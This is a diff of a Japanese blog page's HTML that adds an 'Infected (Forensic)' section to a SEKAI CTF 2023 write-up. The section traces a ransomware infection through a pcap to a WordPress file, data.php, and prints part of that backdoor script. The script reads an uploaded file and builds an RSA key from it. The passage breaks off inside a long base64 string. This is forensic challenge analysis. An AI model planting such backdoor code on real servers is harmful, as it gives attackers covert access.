@@ -58,7 +58,7 @@
 
         gtag('config', 'UA-122086587-6', {"send_page_view":false});
       }
-      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">SEKAI CTF 2023 Writeup - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="SEKAI CTF 2023 の Writeup です。"/><meta data-react-helmet="true" property="og:site_name" content="SEKAI CTF 2023 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/ed9d8e07d4379543e5cc63db49b8ac71/ctf-sekaictf-2023.png"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="SEKAI CTF 2023 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="SEKAI CTF 2023 の Writeup です。"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/ed9d8e07d4379543e5cc63db49b8ac71/ctf-sekaictf-2023.png"/><link as="script" rel="preload" href="/webpack-runtime-a3c0f166cb4b802ff58f.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-8d128062fbe26704a1ed.js"/><link as="script" rel="preload" href="/app-d5650cb600212674c03b.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/ctf-sekaictf-2023/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">SEKAI CTF 2023 Writeup</h1><div class="Content-module--content__body--2TrQ-"><p>8/26 から開催されていた SEKAI CTF 2023 に 0nePadding で参加していました。</p>
+      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">SEKAI CTF 2023 Writeup - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="SEKAI CTF 2023 の Writeup です。"/><meta data-react-helmet="true" property="og:site_name" content="SEKAI CTF 2023 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/ed9d8e07d4379543e5cc63db49b8ac71/ctf-sekaictf-2023.png"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="SEKAI CTF 2023 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="SEKAI CTF 2023 の Writeup です。"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/ed9d8e07d4379543e5cc63db49b8ac71/ctf-sekaictf-2023.png"/><link as="script" rel="preload" href="/webpack-runtime-a3c0f166cb4b802ff58f.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-b4913a7476bc50bd9bf8.js"/><link as="script" rel="preload" href="/app-deac8c16bc866e501791.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/ctf-sekaictf-2023/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">SEKAI CTF 2023 Writeup</h1><div class="Content-module--content__body--2TrQ-"><p>8/26 から開催されていた SEKAI CTF 2023 に 0nePadding で参加していました。</p>
 <p>今回の最終順位は 347 位でした。。</p>
 <p>実力不足を嘆きつつ、いつものように復習を兼ねて Writeup を書きます。</p>
 <p>面白そうな問題がいくつもあったので、解けなかった問題も後でチャレンジしていきたいと思います。</p>
@@ -69,6 +69,7 @@
 <li><a href="#guardians-of-the-kernelrev">Guardians of the Kernel(Rev)</a></li>
 <li><a href="#eval_meforensic">Eval_Me(Forensic)</a></li>
 <li><a href="#def-con-invitationforensic">DEF CON Invitation(Forensic)</a></li>
+<li><a href="#infectedforensic">Infected(Forensic)</a></li>
 <li><a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ</a></li>
 </ul>
 <h2 id="azusawas-gacha-worldrev" style="position:relative;"><a href="#azusawas-gacha-worldrev" aria-label="azusawas gacha worldrev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Azusawa’s Gacha World(Rev)</h2>
@@ -585,6 +586,315 @@ xor_file<span class="token punctuation">(</span><span class="token string">"defc
         </picture>
   </a>
     </span></p>
+<h2 id="infectedforensic" style="position:relative;"><a href="#infectedforensic" aria-label="infectedforensic permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Infected(Forensic)</h2>
+<blockquote>
+<p>Our systems recently got ransomwared, and we tracked the origin to our web server. We’re not sure how they got access, can you find out?</p>
+</blockquote>
+<p>問題バイナリとして pcap と Wordpress サーバのファイル一式が与えられました。</p>
+<p>問題文を読んだ感じ、ランサムの感染経路を特定すればよさそうです。</p>
+<p>とりあえず pcap を Wireshark で開いて HTTP リクエストの統計を取ってみたところ、色々と不審なリクエストが着弾していることがわかります。</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 790px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/cdd469c89db9608e6ec0938381be19b3/2e237/image-20230830184838040.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 84.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAABR0lEQVQ4y61Ti26CQBDk/3+uitXyEnlaeopglTc4vd1EQyO1om4yuYQ9Zmd2bxXP9WBbNuI4RrJLkCQJuq4Dxel0GoWmaaCEQYh1GCJNUzwbbdNCMQ0T9tJGmqSo65qrXKFuOFdV1SDKsuSzKAoo6nSKydsEH/MFZuoM8/c51KkKKqRrGoO++X7ATkJC0EcA13URRRG3TRFCwNQNaAsNhjyXlsWKj8cjDocD8jxnddSj/4J7SFWjzwhFXjAJEWRZdiGsyuryw11D8aRcUzclQfZn5XunTE4UQ9PhOS66Gxf7pEPFzicTLk0LG7H9lRwTfUK27NgriC9xU8UowpWc6H7//RKFbNmST2UlVfYTTxH6csobsTmnn7e8XoeIt/FLFF7eoe8FaNv26pmMtywJae1oJ4cuPdRD13Fgy6HQYhOyLH9YIVn+Ad+aMN+bn5S9AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/cdd469c89db9608e6ec0938381be19b3/8ac56/image-20230830184838040.webp 240w,
+/static/cdd469c89db9608e6ec0938381be19b3/d3be9/image-20230830184838040.webp 480w,
+/static/cdd469c89db9608e6ec0938381be19b3/02aff/image-20230830184838040.webp 790w"
+              sizes="(max-width: 790px) 100vw, 790px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/cdd469c89db9608e6ec0938381be19b3/8ff5a/image-20230830184838040.png 240w,
+/static/cdd469c89db9608e6ec0938381be19b3/e85cb/image-20230830184838040.png 480w,
+/static/cdd469c89db9608e6ec0938381be19b3/2e237/image-20230830184838040.png 790w"
+            sizes="(max-width: 790px) 100vw, 790px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/cdd469c89db9608e6ec0938381be19b3/2e237/image-20230830184838040.png"
+            alt="image-20230830184838040"
+            title="image-20230830184838040"
+            loading="lazy"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>また、このサーバに対するリクエストは 404 が返却されるものが非常に多かったので、一旦ステータスコードが 200 のパケットのみを抽出します。</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/38e369586adff0f790514116d0ae0559/3f8aa/image-20230830212957906.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABnElEQVQoz1WRbVPiQBCE+f+/5rRARIkhvCRcQiCAvJ2JScSAQCCCoHdaZduzUN7dh62dmp55trs2NwzuEDxO4M8jxKsYwSLCOInhJwGS7AnpYYPVfo30daNqudeqXv9zThrrXHdmwpkacGc1DDIbvZWJXmphsmthvHXQX1vopyZaiUGtCW9hYrD5Sd3F3b6NodqRmSb7NnLesggrOuNCAd3lJUbPZYolRH9qCH9X8WuvI/6owaXuPOZhP5zz8QLnNKXJfHt+wf08wSXk2osiGuEPOGx0CBxkZXQJDAjz3wxMuBQSLg/aBMrcbXaN6aeFGZpqpsUHpO8J0CPEFIdsdtkYbjXGvFLA4I0ODxWE73QoLjjToQE54XsdCSz4r8bRoeynV3T4xMjxCUhnQ0boEXgvQIl80I9A6jIz2h6jSn/yoiuH7jeQDt25AM/hsCGWFTD961BFPjm0GWu005Tr8e5GpfkfSIf1hxI0Pw8jInh2DWeloznnx7w00NvV0cmq6O8bqNwXoAf8lIUGN63AWd6o2qNen5ZQjWW/jC/6ATG8P4r+VQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/38e369586adff0f790514116d0ae0559/8ac56/image-20230830212957906.webp 240w,
+/static/38e369586adff0f790514116d0ae0559/d3be9/image-20230830212957906.webp 480w,
+/static/38e369586adff0f790514116d0ae0559/e46b2/image-20230830212957906.webp 960w,
+/static/38e369586adff0f790514116d0ae0559/c6c08/image-20230830212957906.webp 1337w"
+              sizes="(max-width: 960px) 100vw, 960px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/38e369586adff0f790514116d0ae0559/8ff5a/image-20230830212957906.png 240w,
+/static/38e369586adff0f790514116d0ae0559/e85cb/image-20230830212957906.png 480w,
+/static/38e369586adff0f790514116d0ae0559/d9199/image-20230830212957906.png 960w,
+/static/38e369586adff0f790514116d0ae0559/3f8aa/image-20230830212957906.png 1337w"
+            sizes="(max-width: 960px) 100vw, 960px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/38e369586adff0f790514116d0ae0559/d9199/image-20230830212957906.png"
+            alt="image-20230830212957906"
+            title="image-20230830212957906"
+            loading="lazy"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>GET クエリの一覧を参照したものの、ランサムの感染に直接繋がりそうな情報は見当たりませんでした。</p>
+<p>そこで、次は POST メソッドに絞ってパケットを抽出します。</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/d99592a1439ee734d80f025d68f71d3e/61583/image-20230830213247891.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 27.500000000000004%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABTklEQVQY01WQ6U7CQBSF+/5vI4LKUqGFSMsiUBaRtRCBQksRgbYo5nM6wUR/fDkz505u5hzFcRY4rofruzjeloWzxvN9jkHAKQwJoojw80x4/iWSBDFidorCfyiGncfyTBqbJ57XBi3XpLurCs+4qim9GMur0NlWaQvt7mq8HhqMghbDPyi1RZJxUOBll6XtPjCNdOyzziTSWGPS36vEbyrzBJablv4k1KTOvkqsMFhSlqwEivGW4uVQwPJzPG8y9E8ag7DIINCZi4XtnYq5uKM0TVBfpxnKWVFqjH0pM/s2BGVsgaJNU7TeNWobFWOZwdrrdI8lOocS40uVuvuINkmSHyXIj2/R7TtxT6EOE/JccbI0/AJNQedQFD+c3zA4PtL1MzQ396KTAtNr5DhOf5+jtkxiishx9PY2LaI/UF+lRJdpeqKq3nuW/ocq+QHVoawEHYsvkQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/d99592a1439ee734d80f025d68f71d3e/8ac56/image-20230830213247891.webp 240w,
+/static/d99592a1439ee734d80f025d68f71d3e/d3be9/image-20230830213247891.webp 480w,
+/static/d99592a1439ee734d80f025d68f71d3e/e46b2/image-20230830213247891.webp 960w,
+/static/d99592a1439ee734d80f025d68f71d3e/f992d/image-20230830213247891.webp 1440w,
+/static/d99592a1439ee734d80f025d68f71d3e/1548f/image-20230830213247891.webp 1616w"
+              sizes="(max-width: 960px) 100vw, 960px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/d99592a1439ee734d80f025d68f71d3e/8ff5a/image-20230830213247891.png 240w,
+/static/d99592a1439ee734d80f025d68f71d3e/e85cb/image-20230830213247891.png 480w,
+/static/d99592a1439ee734d80f025d68f71d3e/d9199/image-20230830213247891.png 960w,
+/static/d99592a1439ee734d80f025d68f71d3e/07a9c/image-20230830213247891.png 1440w,
+/static/d99592a1439ee734d80f025d68f71d3e/61583/image-20230830213247891.png 1616w"
+            sizes="(max-width: 960px) 100vw, 960px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/d99592a1439ee734d80f025d68f71d3e/d9199/image-20230830213247891.png"
+            alt="image-20230830213247891"
+            title="image-20230830213247891"
+            loading="lazy"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>一通りみたところ、明らかに一番下の data.php 宛ての通信で file というデータを POST 送信しており、何かがおかしいことに気づきます。</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/6c49ef0f0691e18161763b81485e27c7/f2331/image-20230830213754268.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABGUlEQVQoz52R2W7CMBBF8///xgNqpDYQCYgJZHdI7NiOl1s7NBWo5aEd6WhmLM2dxVF+uqDOCMrsjK5uQOkNjHGoWUOq+QdKaShtXhIVbzHaOMZACCTtMfMJamQQPpbDAMXYkq9+FhLWOVj7C/49qncpaJJgzHOIpoHougUtBJwx+KtFPckxHo/g1yumsoRsW8ggvFJVEHUN1fvpx3FBUgo9TTBS3vHNjVJwYcIuTTEk7+Cngxc+YCoKCC/M/AnUV6HmfCm0Wt+ZZ1g/vXvE2rvgPibYbzNkHwRj08P6TsYfP3Q0vtA9rONe8LTyNm6x2TS4FH4Fi39bmG4RJOcBhAy4XhiqkqPv5QKl4jsO3G4B9ZSvPvzwKvoJP95sJZVKcvAAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/6c49ef0f0691e18161763b81485e27c7/8ac56/image-20230830213754268.webp 240w,
+/static/6c49ef0f0691e18161763b81485e27c7/d3be9/image-20230830213754268.webp 480w,
+/static/6c49ef0f0691e18161763b81485e27c7/e46b2/image-20230830213754268.webp 960w,
+/static/6c49ef0f0691e18161763b81485e27c7/9b6fe/image-20230830213754268.webp 1427w"
+              sizes="(max-width: 960px) 100vw, 960px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/6c49ef0f0691e18161763b81485e27c7/8ff5a/image-20230830213754268.png 240w,
+/static/6c49ef0f0691e18161763b81485e27c7/e85cb/image-20230830213754268.png 480w,
+/static/6c49ef0f0691e18161763b81485e27c7/d9199/image-20230830213754268.png 960w,
+/static/6c49ef0f0691e18161763b81485e27c7/f2331/image-20230830213754268.png 1427w"
+            sizes="(max-width: 960px) 100vw, 960px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/6c49ef0f0691e18161763b81485e27c7/d9199/image-20230830213754268.png"
+            alt="image-20230830213754268"
+            title="image-20230830213754268"
+            loading="lazy"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>問題バイナリから data.php を探したところ、以下のような受け取ったデータをファイルとして復号するようなスクリプトでした。</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// error was suppressed with the @-operator</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    
+    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ErrorException</span><span class="token punctuation">(</span><span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">try</span> <span class="token punctuation">{</span>
+    <span class="token variable">$ab8a69</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$a1721b</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$ab8a69</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$abdfbe</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$a1721b</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$ab8a69</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$ae25f0</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$abdfbe</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$abdfbe</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"..."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$aa1090</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$abdfbe</span><span class="token punctuation">,</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$abdfbe</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"..."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$afd8f0</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"-----BEGIN RSA PRIVATE KEY-----\n"</span><span class="token operator">.</span><span class="token function">chunk_split</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$aa1090</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"-----END RSA PRIVATE KEY-----\n"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$aa13a9</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"KG2bFhlYm8arwrJfc+xWCYqeoySjgrWnvA9zuVfd/pBwnmC8vAdOTydYKDC0VE10xRTq6+79HX7QgCScYjQ8ogHzkppFN2ifFSBkM1bzWckTl6shvZvp8d7678ZxlPZOhm4q0MtJ7BMFRbZuSKl10o1UDUkwVm7CZfCBQd1NLf0=,OfCbPFExBkpXi5F+SohxpXQLHvICHKF64rUIxVwhR83nMmO0k9Xqjh4+FHMCz0KcFXF5CGR6WUWC+aDqDhJZTgossQ+h1tSEfHpFif87ip0/OEHerOfyfPtQR3E62xUW1++3gm8WB38nkFiP6o1bkIdd9ZYObwQsp0YPlrj6AlA=,MiH8FWh7hHp+Yr2/Kv78WvMItwiwaCiO4DwBTq/IXU99hHUvb8iayOBUzLtr4Xg9wBGzHq73fY266XK+60YboIC15Es1J7vN8XRsUhlxavf8ssVmYDz4gz08+V9Ow+0k39Ef9Ic4NSiN+vbHCyCdFkvFsbfuUbyCHoxZyAjp1Z4=,pjnJiJt4sgRW48wgVIEmygN5+0HJiAVma5JPxQMIcpYqZUBsPkAW6/2wcMjqkZ7wzXdYZy706JV5gGm1F2egrtEtrsfo2V5eVMOsgLmB/ApVYmYsJ0DBl/8npo0JtvKM3dMeOg9LL5v+26QLKOxDRSX74rAYNSw4iPeH5y4SxCQ=,KkU+QkZ1PbLmKmfcLUGxUDMIWTKoYo9YAfiwe5heK1WwbuqoH2ra3WEv3vLCePK6ovlJoybcCeutQNY5AiR5OOuEAS/uM82WBCffE03cxezkkQPWbA43bstduUHgM6afqxPj6YaFI/C2ARQCYOWGMzYLeCdLkuKfvriudv/XnO0=,CtiyfFrf9+p8L2m6js0jmyHt5+1kYjfD0uO2Nggvkv+fZuBfGmN2BWxvD+oUBVA2TXkKQi+pBBlsc+9WWIjnL7ZCyWol9qUOHIwGdN8ab2IKI3Zl5qUwIFQcJHGRVeAjGnEOGM8iU5T1JZjO+QwJB9LTvyh8Ki9SGjqqxnNGT/M=,VszkcW2yR61TdtOSpRlh4DZ05SOlNR0n8rOlzdmnE+3RBarszIVsSg+59Yc7B+8+NqAslN32qBcu0sW5e+Vz3ABxdnIgaMoQcJ5Ku9T2p2UbuZ0j+LYxTrcIqnlc+THi8Do9q+Lml34/woKDOIIkKrjHhVnf6dusxI7Dv7z3oU0=,pIDhg8+nNcqxxClYVaYAGKig3/T0KWWbDm0BWN0M3u8ST0Nw6Am/crxXGMddK8m6qW5oyOvWgiD6XdUy0cfUo3zeXCXo3UYa+hxrTIKj1SS/n4LkzQ6egSRq4XK1fECKApY+8eiLEMOvyixnzD2ohs6FA5R/a12bMx8xzLctTG8=,TwB9lsoQC47npnc0Fy+Gt85zuRkuk8e1kPjogierA3tZiA6zs+6Qc6d9Ri7kfpasekO4dhZsM1W9z0n/zWpq+0Xp5tJ77mpryGPfae3KRSTS0QscQMi/ZhD+Pi6ajL3FoxKI7wfZ7RA0OKGSxhbiNHcD6WEShSbHILkuC7wWVMw=,rq0fb0wiKfJyqd3CCVAmwu3a8